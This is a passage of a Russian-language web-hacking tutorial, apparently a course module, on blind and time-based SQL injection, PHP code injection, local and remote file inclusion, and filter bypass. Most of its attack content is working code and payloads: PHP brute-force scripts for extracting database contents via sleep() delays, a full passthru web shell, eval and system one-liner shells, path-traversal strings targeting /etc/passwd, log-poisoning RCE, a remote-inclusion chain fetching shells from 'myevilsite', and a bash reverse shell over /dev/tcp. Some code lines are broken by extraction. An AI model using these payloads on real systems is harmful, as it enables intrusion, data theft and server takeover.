В итоге все сводится к анализу ложных или истинных ответов, тем самым получают информацию посимвольно. Рассмотрим на примерах Normal blind инъекции. Начнем с того, каким образом можно определить слепую sql-инъекцию. Все определение сводится к анализу на изменение логики.

Например, есть уязвимый сайт: `http://example.com/news.php?id=1`

Этот запрос возвращает на страницу новость с id равным 1. Напомним, что это слепая инъекция, поэтому всякого рода подставления кавычек и прочего не дадут результата. В БД происходит выборка по следующему запросу:

```sql
SELECT title, descr, body FROM news WHERE id = $id
```

`$id` — это то, что передает пользователь.

Если мы отправим строку вида:<br>`http://example.com/news.php?id=1 and 1=1`

То на странице отобразится та же новость, что и раньше.

Но если мы добавим:<br>`http://example.com/news.php?id=1 and 1=0`

То результирующий запрос изменится:

```sql
SELECT title, descr, body FROM news WHERE id = $id AND 1=0  
```

Он никогда не выполнится, и поэтому на странице не отображается новость. Это должно послужить сигналом о том, что перед нами blind sql injection.

Также для определения инъекции могут помочь следующие пейлоады:
- `AND true`
- `AND false `
- `'AND true - - `
- `'AND false - - `
- `'AND true %23 `
- `'AND false %23`

### Double blind sql Injection

> также известная как Time-based SQL injection или абсолютно слепая SQL-инъекция, — это метод атаки, применяемый в условиях, когда не только недоступен вывод ошибок, но и сам SQL-запрос используется исключительно для внутренних операций, таких как журналирование событий или оптимизация.

Этот тип инъекции считается достаточно сложным, так как зачастую сложно определить, присутствует ли уязвимость. Для ее обнаружения используют метод ложных и истинных запросов, вызывающих задержки в выполнении. Для эксплуатации уязвимости применяется посимвольный перебор с использованием временных задержек.

Название атаки отражает ее суть: требуется сформировать запрос, содержащий функции, которые искусственно задерживают выполнение. Если запрос выполняется мгновенно, это означает, что инъекция не удалась. Если же наблюдается задержка, то запрос успешно обработан, что подтверждает наличие уязвимости.

Пример определения:

```sql
id' and sleep(10) -- 
```

Пример эксплуатации:

```sql
id=1' and if (Ascii(substring((Select user()),1,1))>97, sleep(10),0) --
```

Обратите внимание на функцию `sleep(10)`. Это та самая функция для задержки выполнения запроса, в конкретном примере на 10 секунд. Т.е. если страница загрузилась спустя 10 секунд, то у нас есть уязвимость.

Разберем пример эксплуатации подробнее.
- `substring((Select user()),1,1)` — сначала sql-запрос возвращает строку с результатом. Потом функция substring возвращает первый символ этой строки.
- `Ascii(substring((Select user()),1,1))` — возвращает код символа по ASCII.
- Код 97 соответствует символу «a» латинского алфавита. Все, что ниже этого кода, не будет являться символом латинского алфавита. Поэтому мы проверяем, является ли первый символ запроса буквой.
- Если является, то далее функция `sleep` приостановит работу выполнения на 10 секунд. Именно благодаря этому мы и понимаем, что инъекция прошла.

Есть множество путей проведения быстрой эксплуатации. Это зависит от вашей фантазии и опыта. Ниже приведен простой пример проверки по символам на основе временной задержки.

```javascript
function brute($column,$table,$lim) 
{ 
  $ret_str = ""; 
  $b_str = "1234567890_abcdefghijklmnopqrstuvwxyz"; 
 
   
 
21 
  $b_arr = str_split($b_str); 
  for ($i=1;$i<100;$i++) 
  { 
    print "[+] Brute $i symbol...\n"; 
    for ($j=0;$j<count($b_arr);$j++) 
    { 
      $brute = ord($b_arr[$j]); 
      $q = 
"/**/and/**/if((ord(lower(mid((select/**/$column/**/from/**/$table/**/li
 mit/**/$lim,1),$i,1))))=$brute,sleep(6),0)--"; 
      if (http_connect($q)) 
      { 
        $ret_str=$ret_str.$b_arr[$j]; 
        print $b_arr[$j]."\n"; 
        break; 
      } 
      print "."; 
    } 
    if ($j == count($b_arr)) break; 
  } 
  return $ret_str; 
}
```

Приведем описание построчно сверху вниз, пропуская операторные скобки:
- Сначала задается имя функции `brute` и аргументы: `column` — колонки таблицы, `table` — сама таблица, `limit` — сколько строк выводить.
- Инициализируется переменная `ret_str` в которой будет храниться результат.
- Инициализируется переменная `b_str` строкой с символами, которыми будем брутить. В нашем случае берем цифры, буквы и нижнее подчеркивание.
- Инициализируем массив символами из строки для брута.
- Запускаем цикл до 100, другими словами предполагаем, что sql-запрос вернет строку не менее 100 символов.
- Следующая строка декоративная, просто выводит какой именно номер символ брутится в данный момент выполнения скрипта.
- Запускаем цикл по массиву с нашими символами для брута.
- Каждый символ приводим к его коду по ASCII и инициализируем им переменную brute.
- Инициализируем переменную `q` нагрузкой, которой будем эксплуатировать уязвимость.
- Далее делаем запрос и если удачно, то…
- В переменную для результата дописываем символ, который подошел.
- Показываем, что символ подошел.
- Выходим из цикла брута по символам.
- Декоративный элемент, печатаем точку.
- Проверка, если мы дошли до последнего символа в нашем массиве символов для брута, то не имеет смысла проверять следующие буквы sql-запроса, выходим из верхнего цикла.
- Возвращаем результат брута.

Подробнее про строку запроса по вложенности наружу:
- `mid((select/**/$column/**/from/**/$table/**/limit/**/$lim,1),$i,1)`<br>возвращает один символ от запроса. Номер символа зависит от переменной $i;
- `lower(mid((select/**/$column/**/from/**/$table/**/limit/**/$lim,1),$i,1))`<br>приводит символ к нижнему регистру;
- `ord(lower(mid((select/**/$column/**/from/**/$table/**/limit/**/$lim,1),$i,1)))`<br>возвращает код по ASCII символа.

Также в скрипте присутствует функция http_connect. Ее листинг ниже:

```javascript
function http_connect($query) 
{ 
       $server = "http://example.com/index.php?id=1" 
        $headers = array( 
            'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows N
rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14', 
            'Referer' => $server 
        ); 
 
        $res_http = new HttpRequest($server.$query, HttpRequest
        $res_http->addHeaders($headers);  
        $t = mktime(); 
        try { 
                $response = $res_http->send()->getBody(); 
 
                $t = mktime() - $t; 
 
                if ($t > 5) 
                { 
                        return 1; 
                } 
                else 
                { 
                        return 0; 
                } 
 
        } catch (HttpException $exception) { 
 
                print "[-] Not connected"; 
                exit(0); 
        } 
} 
```

Рассмотрим кратко, что делает эта функция:
- Переменная `server` инициализируется URL адресов уязвимого файла.
- Переменная `headers` инициализируется данными описывающими заголовок для запроса.
- Создается http запрос методом GET, в котором содержится адрес до уязвимого файла и наша нагрузка.
- Далее добавляются http заголовки.
- После чего сохраняется время отправки запроса в переменную t.
- Далее пытаемся отправить запрос и получить ответ.
- После чего высчитываем разницу времени между датой отправки запроса и даты получения ответа.
- Если разница около 6, секунд возвращаем 1.
- Иначе возвращаем 0.

Возникает проблема отчета времени. Эту проблему можно решить следующим образом:
1. Строка символов для брута используется в алфавитном порядке, и каждый символ этой строки мы проверяем в том же порядке. Но в жизни в словах есть закономерности, при которых какая-то буква будет встречаться чаще, чем другая. Другими словами, можно использовать частотный анализ.
1. Можно усилить эффект от частотного анализа, если мы будем применять технологию цепочек букв. Другими словами, какие-то буквы чаще встречаются после определенных букв.

Первую часть можно реализовать, просто изменив строку для брута на `«tashwiobmcfdplnergyuvkjqzx_1234567890»`, а вот вторую часть рассмотрим в скрипте ниже:

```javascript
function brute($column,$table,$lim) 
{ 
  $ret_str = ""; 
  $b_str = "tashwiobmcfdplnergyuvkjqzx_1234567890"; 
  $b_arr = str_split($b_str); 
  for ($i=1;$i<100;$i++) 
  { 
    if($last_ltr){ 
      switch ($last_ltr){ 
        case "q": { $b_arr = 
str_split("uaqoisvretwybnhlxmfpzcdjgk_1234567890");} 
        case "w": { $b_arr = 
str_split("ahieonsrldwyfktubmpcgzvjqx_1234567890");} 
        case "e": { $b_arr = 
str_split("rndsaletcmvyipfxwgoubqhkzj_1234567890");} 
        case "r": { $b_arr = 
str_split("eoiastydnmrugkclvpfbhwqzjx_1234567890");} 
        case "t": { $b_arr = 
str_split("hoeiartsuylwmcnfpzbgdjkxvq_1234567890");} 
        case "y": { $b_arr = 
str_split("oesitamrlnpbwdchfgukzvxjyq_1234567890");} 
        case "u": { $b_arr = 
str_split("trsnlgpceimadbfoxkvyzwhjuq_1234567890");} 
        case "i": { $b_arr = 
str_split("ntscolmedrgvfabpkzxuijqhwy_1234567890");} 
        case "o": { $b_arr = 
str_split("nurfmtwolspvdkcibaeygjhxzq_1234567890");} 
        case "p": { $b_arr = 
str_split("eroaliputhsygmwbfdknczjvqx_1234567890");} 
        case "l": { $b_arr = 
str_split("eliayodusftkvmpwrcbgnhzqxj_1234567890");} 
        case "k": { $b_arr = 
str_split("einslayowfumrhtkbgdcvpjzqx_1234567890");} 
        case "j": { $b_arr = 
str_split("euoainkdlfsvztgprhycmjxwbq_1234567890");} 
        case "h": { $b_arr = 
str_split("eaioturysnmlbfwdchkvqpgzjx_1234567890");} 
        case "g": { $b_arr = 
str_split("ehroaiulsngtymdwbfpzkxcvjq_1234567890");} 
        case "f": { $b_arr = 
str_split("oeriafutlysdngmwcphjkbzvqx_1234567890");} 
        case "d": { $b_arr = 
str_split("eioasruydlgnvmwfhjtcbkpqzx_1234567890");} 
        case "s": { $b_arr = 
str_split("tehiosaupclmkwynfbqdgrvjzx_1234567890");} 
        case "a": { $b_arr = 
str_split("ntrsldicymvgbpkuwfehzaxjoq_1234567890");} 
        case "z": { $b_arr = 
str_split("eiaozulywhmtvbrsgkcnpdjfqx_1234567890");} 
        case "x": { $b_arr = 
str_split("ptcieaxhvouqlyfwbmsdgnzrkj_1234567890");} 
        case "c": { $b_arr = 
str_split("oheatikrlucysqdfnzpmgxbwvj_1234567890");} 
        case "v": { $b_arr = 
str_split("eiaoyrunlsvdptjgkhcmbfwzxq_1234567890");} 
        case "b": { $b_arr = 
str_split("euloyaristbjmdvnhwckgpfzxq_1234567890");} 
        } 
    } 
    print "[+] Brute $i symbol...\n"; 
    for ($j=0;$j<count($b_arr);$j++) 
     { 
      $brute = ord($b_arr[$j]); 
      $q = 
"/**/and/**/if((ord(lower(mid((select/**/$column/**/from/**/$table/**/li
 mit/**/$lim,1),$i,1))))=$brute,sleep(6),0)--"; 
      if (http_connect($q)) 
      { 
        $ret_str=$ret_str.$b_arr[$j]; 
        print $b_arr[$j]."\n"; 
        $last_ltr=$b_arr[$j]; 
        break; 
      } 
      print "."; 
    } 
    if ($j == count($b_arr)) break; 
  } 
  return $ret_str; 
}
```

Что изменилось?
1. Первая новация — это строка символов для брутфорса. Символы в ней расположены в порядке убывания частоты их встречаемости.
1. Вторая — оператор ветвления `switch`, который управляется переменной `last_ltr`. На первой итерации внешнего цикла этот оператор не используется. Он вступает в действие только после нахождения первого символа. Затем переменная `last_ltr` инициализируется этим символом, и, благодаря оператору `switch`, строка символов для брутфорса изменяется на соответствующую.

## PHP injection

> Personal Home Page tools, скриптовый язык общего назначения с открытым кодом. Он активно применяется для создания веб приложений и является самым популярный языком для создания динамических веб-сайтов. При работе php генерирует html код, а его скрипты выполняются на стороне сервера и не могут быть увидены клиентом.

Основные возможности php:
- Создание скриптов для выполнения на стороне сервера.
- Создание скриптов для выполнения в командной строке.
- Создание оконных приложений, выполняющихся на стороне клиента (http://gtk.php.net/).

> **PHP инъекция**<br>это еще один вид инъекций, смысл которой заключается в том, чтобы заставить выполнить на стороне атакуемого сервера свой php код. Это становится возможным, когда в php коде неправильным образом используются потенциально опасные функции.

Рассмотрим на самом тривиальном примере. Допустим, вы зашли на сайт, у которого «шапка» выглядит так:

![alt text](./imgs/mod3_5_php1.png) 

При переходе по этим ссылкам URL меняется следующим образом:

```
http://example.com/index.php?page=home
http://example.com/index.php?page=shop
http://example.com/index.php?page=business
http://example.com/index.php?page=subscriptions
http://example.com/index.php?page=gifting
```

Параметр page уязвим к php инъекции, потому что index.php имеет следующий код:

```php
<?php
 if (isset($_GET['page'])) {
  $page = $_GET['page'];
  include($page.".php");
 }
?>
```

Другими словами, на стороне сервера есть php файлы: home.ph, shop.php, business.php, subscriptions.php, gifting.php … а через параметр page скрипт index.php просто их подключает.

Теперь можно у себя на сервере создать вредоносный php код. Рассмотрим его:

```php
<?php
 echo "
  <html>
      <head>
          <title>SHELL</title>
      </head>
      <body>";
 echo "<form method=post>";
 echo "<input type=text name=cmd size=100>";
 echo "</form>";
 echo "<pre>";
 if ((!$_POST['cmd']) || ($_POST['cmd']=="")) {
     $_POST['cmd']="id;pwd;uname -a;ls -la";
 }
 echo "".passthru($_POST['cmd'])."</pre>
      </body>
  </html>";
?>
```

Разберем подробнее, что он делает:
1. Строки кода с 1 по 9, а также с 15 по 16 — это просто формирование формы ввода, куда в дальнейшем мы будем вводить команды.
1. Строки кода с 10 по 14 формируют результат запрошенной команды.
1. Строка кода 11 — это проверка на первое подключение шела.
1. Строка кода 12 — если шелл только что подключился, или в форме была передана пустая строка, то выполнится ряд стандартных команд `id;pwd;uname -a;ls -la`.
1. Строка кода 14 — это непосредственно выполнение и вывод уязвимого кода. `passthru($code)` — выполняет внешнюю программу и выдает результат. Аналогично работает функция `exec(), shell_exec(), system()`...

Попробуем подключить созданный файл на сервере жертвы:<br>`http://example.com/index.php?page={адрес вашего сервера}/payload`

В итоге получаем веб-шелл:

![alt text](./imgs/mod3_5_php2.png) 

Обратите внимание на то, что путь к файлу payload.php был прописан без расширения, т. к. на сайте жертвы расширение дописывается само.

### Потенциально опасные функции

- include()
- require()
- require_once()
- include_once()
- eval() — функция выполняет PHP код, переданный ей в виде строки

Допустим, есть шаблон приветствия, в который передается имя:

```php
<?php
 if (isset($_GET['name'])) {
  $name =$_GET['name'];
  $hello = '';
  eval("\$hello = '<h2>Welcome <i>'.$name.'</i> to site!</h2>';");
  echo $hello;
 }
?>
```

Чтобы проверить, уязвим ли параметр `name` в запросе к eval-инъекции, можно попробовать подставить одно из следующих значений:
- `<?php phpinfo(); ?>`
- `phpinfo();`

#### preg_replace($pattern, $replacement, $string)

Эта функция выполняет поиск совпадений в строке `$string` по регулярному выражению `$pattern` и заменяет их на значения из `$replacement`.

Функция становится опасной, если в регулярном выражении используется модификатор `e(PREG_REPLACE_EVAL)`. При его использовании, перед заменой, результат обработки строки выполняется как `PHP`-код. Это может привести к выполнению произвольного кода, если входные данные недостаточно проверяются.

Важно отметить, что начиная с PHP 7.0 модификатор e был удален из-за своей небезопасности, поэтому в современных версиях PHP эта уязвимость не актуальна.

В версии `php` 7.0 уже удалена поддержка этого модификатора. Вместо него предлагают использовать `preg_replace_callback($pattern, $callback)`.

`preg_replace_callback($pattern, $callback, $string)` — функция формирует массив из совпадений по регулярному выражению `$pattern` в строке `$string` и передает его на вход лямбда-функции `$callback`, которая и является безопасной заменой функции `eval()`. Но бывают случаи, когда лямбда функцию создают с помощью функции `create_function($args, $code)`.

`create_function($args, $code)` — функция создает лямбда функцию, которая принимает на вход строку с аргументами `$args` и выполняет `php` код `$code`.

Именно эта функция использует тот же принцип, что и `eval()`, а это значит, она так же уязвима, как и `eval()`.

Для проверки уязвимости функции `preg_replace($pattern, $replacement, $string)` используйте версию `php` до 7.0 и следующий код в `php` файле:

```html
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>Document</title>
</head>
<body>
 <?php
  if (isset($_GET['val'])) {
   $val = $_GET['val'];
   print preg_replace('/(.*)/e', 'strtoupper("\\1")', '$string');
  }
 ?>
</body>
</html>
```

Для проверки уязвимости функции `preg_replace_callback($pattern, $callback, $string)` используйте версию php от 7.0 и следующий код в php файле:

```html
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>Document</title>
</head>
<body>
<?php
 if (isset($_GET['val'])) {
  $val = $_GET['val'];
  print  preg_replace_callback("/(<\?php|<\?)(.*?)\?>/si",
      create_function(
       '$arr',
       'ob_start();  
       eval("print $arr[2];");  
       $return = ob_get_contents();  
       ob_end_clean();  
       return $return;'),
      $val);
 }
?>
</body>
</html>
```

В примере выше в функции create_function используются функции:
- `ob_start()`; — создание буффера данных.
- `ob_get_contents()`; — получение данных из буффера.
- `ob_end_clean()`; — очищение буффера. Они необходимы для того, чтобы получить результат функции `eval()`.

### LFI и RFI

В этой части мы рассмотрим Local file inclusion и Remote file inclusion. Поговорим о способах обхода защитных систем и о том, как с помощью этих уязвимостей можно выполнить код на сервере.

PHP-файлы, которые по контексту нужно исполнить, подключаются с помощью функций `include` и `require`. Они обе подключают и выполняют файл. Отличие лишь в том, что `require` при ошибке подключения файла останавливает выполнение скрипта.

Обе функции могут подключать как локальные, так и удаленные файлы, что может спровоцировать уязвимости LFI и RFI. Remote File Inclusion, как уже понятно из названия, позволяет подключать файлы с любого удаленного источника и выполнить их.

Эта уязвимость будет работать в том случае, если строковая переменная в момент «инклуда» начинается именно с пользовательского ввода, а в конфигурационном файле php.ini будут следующие настройки:

- `allow_url_open = on`
- `allow_url_include = on`

В противном случае это будет LFI уязвимость, то есть мы сможем подключать только те файлы, которые уже есть на сервере. Это уменьшает наши возможности, но все же позволяет получить доступ к приватной информации на сервере, выполнить нежелательные скрипты, а в некоторых случаях даже выполнить произвольный код.

#### Как искать LFI

Так как LFI и RFI по сути одинаковые уязвимости (RFI — расширенная версия LFI), то и ищутся они одинаково. Поскольку LFI возникает, когда пути, переданные в include или require, не фильтруется должным образом, в Blackbox методе тестирования мы должны искать скрипты, которые принимают имена файлов в качестве параметров.

Рассмотрим следующий пример:<br>`http://vulnerable_host/preview.php?file=example.html`

Это выглядит как идеальное место, чтобы проверить его на LFI. Если атакующему повезло, и скрипт напрямую включает входной параметр, на сервер можно включить произвольные файлы.

Типичным proof-of-concept в этом случае будет загрузка файла passwd:<br>`http://vulnerable_host/preview.php?file=../../../../etc/passwd `

Атакующий увидит список пользовательских учетных записей.

Чаще всего LFI и RFI можно найти на страницах сайта с параметрами page, file, filename, content и так далее:

```
http://vulnerable_host/index.php?display= http://vulnerable_host/index.php?lang= 
http://vulnerable_host/index.php?path= http://vulnerable_host/index.php?file= 
http://vulnerable_host/index.php?page= http://vulnerable_host/index.php?preview= http://vulnerable_host/index.php?url= 
```

### Реальные примеры и обход фильтров

#### Double encoding

Двойное кодирование в url позволяет обходить некоторые фильтры в силу того, что в фильтрах путь до файла будет закодирован, но раскодируется к моменту исполнения:

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

#### Засорение путей

```
http://example.com/index.php?page=....//....//etc/passwd 
http://example.com/index.php?page=..///////..////..//////etc/passwd 
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../% 5C../%5C../%5C../%5C../%5C../etc/passwd 
http://example.com/index.php?page=..%2f..%2f..%2f..%2fetc%2fpasswd 
http://example.com/index.php?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/ passwd 
http://example.com/index.php?page=..%252f..%252f..%252f..%252f..%252fetc% 252fpasswd 
http://example.com/index.php?page=..%255c..%255c..%255c..%255cetc%255cp asswd 
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%af..%c0%afetc%c 0%afpasswd 
http://example.com/index.php?page=%252e%252e\%252e%252e\%252e%252 e\etc\passwd 
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%af..%c0%afetc%c 0%afpasswd 
http://example.com/index.php?page=..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc% c1%9cpasswd
```

#### Сокращение путей

```
http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\. \.\.\.\[ADD MORE]\.\. 
http://example.com/index.php?page=../../../../[...]../../../../../etc/passwd
```

#### Потоки и врапперы

Кроме `http://`, при атаках на RFI можно также использовать `php://`, `file://`, `zip://`, `data://`, `expect://`, `input://`, `phar://`. Это называется врапперами, полный и обновляемый список которых можно посмотреть на официальном сайте вместе с описанием

Многие из врапперов можно использовать не только с RFI, но и с LFI, при том же условии, что в начале пути не будет ничего лишнего (например, разработчик может вставлять в начало строки `/usr/share/includes/(и далее строка, полученная из URL)`). Конечно, все эти врапперы могут фильтроваться либо фаерволом, либо самим исполняемым php-кодом.

Так, например, если в строке фильтруются все точки, то следующий запрос не сработает:

```
http://example.com/index.php?page=file:///etc/passwd
```

##### ftp:// и ssh2://

Разработчик может вручную фильтровать протоколы, закрывая RFI, но он также может забыть о других протоколах: `ftp` и `ssh`, которые тоже можно использовать для RFI:

```
http://example.com/index.php?page=ftp://user:рass@yourhost/shell.txt
ssh2.shell://user:pass@example.com:22/xterm
ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
ssh2.sftp://user:pass@example.com:22/path/to/filename
```

По умолчанию враппер ssh2 выключен, но как показывает практика, нужно тестировать все места, которые только возможно.

##### php://

предоставляет разного рода потоки ввода и вывода

Мы же остановимся на том, что потоки php позволяют получить доступ к стандартным входным, выходным и файловым дескрипторам файлов, временным файловым потокам в памяти и дисковым резервным хранилищам и фильтрам, которые могут управлять другими файловыми ресурсами, поскольку они читаются и записываются.

##### php://filter

С помощью `php://filter/convert.base64-encode/resource=/etc/passwd` мы получим закодированный в base64 файл `passwd: http://example.com/index.php?page=php://filter/convert.base64 encode/resource=../../../../../etc/passwd`

##### php://input

С помощью `php://input` можно раскрутить LFI до выполнения произвольного кода. Дело в том, что `php://input` принимает любые данные через POST-запрос, которые потом благополучно инклудятся.

![alt text](./imgs/mod3_5_phpinput.png)

##### expect://

Выключен по умолчанию, но позволяет выполнять код на стороне сервера:

```
http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls
```

##### data://

Еще один способ выполнить код на сервере — отправить его с помощью враппера `data://:`

`http://example.net/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygp OyAgPz4K`

Здесь полезная нагрузка закодирована в base64, на деле же можно сделать и так:

```
http://example.net/?page=data:,
http://example.net/?page=data:;base64,PD9waHAgcGhwaW5mbygpOyAgPz4K
```

Как видно, в последнем примере не используются знаки «/» и «.» «<>», «()», что позволяет обходить дополнительную фильтрацию.

##### Удаленное выполнение кода

Про RCE уже немало написано выше, в разделе «Потоки и врапперы», но чаще всего их удается использовать только с RFI. Здесь же рассмотрим способы получения RCE с LFI.

##### RCE через логи

Суть метода в том, чтобы найти путь до логов на сервере, записать в логи свой PHP-код и затем подключить файл с логами. Так как в PHP весь текст вне тега игнорируется, это сработает.

Основная сложность состоит в том, чтобы найти путь до логов, в которых будут фиксироваться наши действия.

Самый просто вариант записать свое действие в лог — перейти на несуществующую страницу на сервере, например, так: `http://example.net/nothing_here.php`

Нужно по очереди подключать эти логи и искать записи о своих действиях на сайте, если таковые нашлись (например, это будет `/var/log/apache2/access.log`), то записываем в лог PHP-код, который позволит выполнять произвольные команды:

```php
<?php eval($_GET["cmd"]); ?>
```

Кодируем в url и отправляем: `http://example.net/nothing_here.php?/nothing_here.php?<%3Fphp eval(%24_GET["cmd"])%3B %3F>`

Теперь, обратившись к файлу лога, выполнится наш код:<br>`http://example.net/?page=../../../../../../../var/log/apache2/access.log&cmd=ph pinfo();die();`

##### Шелл через RFI

Пожалуй, самая очевидная техника. Если мы можем загружать файлы на сервер (например, картинки, аватарки и пр.) и знаем путь до этого файла, то с помощью LFI сможем подключить его:<br>`http://example.com/index.php?page=path/to/uploaded/file.png`

Здесь в file.png находится наш шелл:

```php
<?php system($_GET['c']); ?>
```

RFI довольно просто раскрутить до RCE, даже не включая всех методов выше: достаточно заинклудить свой шел с удаленного хоста `myevilsite`, и он выполнится на стороне сервера с `vulnsite`:<br>`http://vulnsite/vuln.php?file=http://myevilsite/reverse-shell.php`

Реверс-шел может быть таким:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); ?>
```

Или же мы можем узнать полный путь скрипта vuln.php, отправив полезной нагрузкой `phpinfo()`:
- запрос: `http://vulnsite/vuln.php?file=http://myevilsite/getinfo.php`
- файл: `getinfo.php`

И затем, вторым запросом записать в эту директорию шелл:

- запрос: `http://vulnsite/vuln.php?file=http://myevilsite/shell-loader.php`
- файл `shell-loader.php`
```sql
<?phpcopy('http://myevilsite/а_тут.шелл','/полный/путь/до/сайта/который/мы/взяли/из/phpinfo/shell.php');?>
```
- файл: `shell.php: <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

Теперь при обращении к `shell.php` на сайте `vulnsite.com` он будет принимать любой код в переменную cmd. Так, например, на сервере выполнится команда `ls`:<br>`http://vulnsite.com/shell.php?cmd=ls`

На данный момент мы имеем арсенал техник обхода фильтров и получения RCE. Много техник кануло в лету, баги в движке PHP, которые можно было использовать пару лет назад, сейчас уже не дают результатов. Но старые техники все равно могут пригодиться при реальном тестировании, так как очень часто можно встретить веб-приложения, которые давно не обновлялись.

##### WAF Bypass

В этой части вы узнаете некоторые трюки, которые позволят обойти слабо продуманные проверки пользовательского ввода, а также плохо настроенные системы обнаружения. Для начала создадим заведомо уязвимое приложение:

```html
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>Document</title>
</head>
<body>
 <?php  


  if (isset($_GET['cmd'])) {
   $cmd = $_GET['cmd'];


   if
(preg_match('/system|exec|passthru|shell_exec|ls|wget|nc|passwd/', $cmd))
{
    echo "hacker detect!";
   }else{
    eval($cmd);
   }
  }


?>
</body>
</html>
```

В данном приложении функция preg_match выступает своеобразным блеклистом, которая определяет в пользовательском вводе опасные команды и выводит сообщение о детекте. Все дальнейшие действия будут направлены на то, чтобы обойти эту функцию и добраться до eval. Перед тем как начать, проверьте работоспособность приложения. Отправьте ему:

```
?cmd=phpinfo();
```
Если в ответ получите страницу информации PHP, то можно продолжать.

1. первый способ, который открывает нам возможности PHP — это эскейп последовательности. А конкретнее, эскейп последовательности символов в шестнадцатеричном виде.<br>Например, для PHP `Hello world` — это то же самое, что и `\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64`.
1. Также стоит отметить, что особенности PHP не позволяют применить этот метод для функций `echo`, `print`, `unset()`, `isset()`, `empty()`, `include`, `require`.

Обновим наше приложение и добавим в блеклист определение кавычек. Теперь проверяющая функция выглядит так:

```php
preg_match('/system|exec|passthru|shell_exec|ls|wget|nc|passwd|[\"\']/', $cmd)
```

Вспомним, для чего вообще нужны кавычки. Они определяют, где строка, а где нет.

Если теперь нет возможности применять их, то как можно передавать параметры в функции? В такой ситуации снова приходит на помощь особенность PHP. Дело в том, что в PHP не только кавычками можно определить строку.

3. Обратите внимание на код приложения. Блеклистом проверяется только параметр $cmd, но никто не заставляет передавать только его. Можно передать несколько с нужными нам значениями, а уже внутри использовать их.

Например:

```php
passthru('whoami') = ?a=passthru&b=whoami&cmd=$_GET[a]($_GET[b])
```

4. Можно получить массив внутренних функций PHP и через них выполнить манипуляции.
- `get_defined_functions` — возвращает массив всех определенных функций. Это ассоциативный массив, состоящий из двух больших массивов.

Существует множество функций, которые отслеживают блеклист. Например, функция system хранится под номером 381

